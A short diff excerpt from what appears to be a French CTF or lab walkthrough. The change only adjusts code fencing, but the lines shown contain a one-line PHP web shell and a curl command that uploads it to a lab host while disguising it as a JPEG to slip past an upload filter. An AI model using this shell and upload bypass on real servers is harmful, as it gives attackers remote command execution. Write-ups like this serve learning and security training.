@@ -9,7 +9,8 @@ On écrit un script php simple:
 `<?php system($_GET['cmd']); ?>`
 
 Puis avec curl on upload ce script:
-```curl -X POST "http://10.171.55.130/index.php?page=upload" \
+```
+curl -X POST "http://10.171.55.130/index.php?page=upload" \
   -F "MAX_FILE_SIZE=100000" \
   -F "uploaded=@shell.php;type=image/jpeg" \
   -F "Upload=Upload"
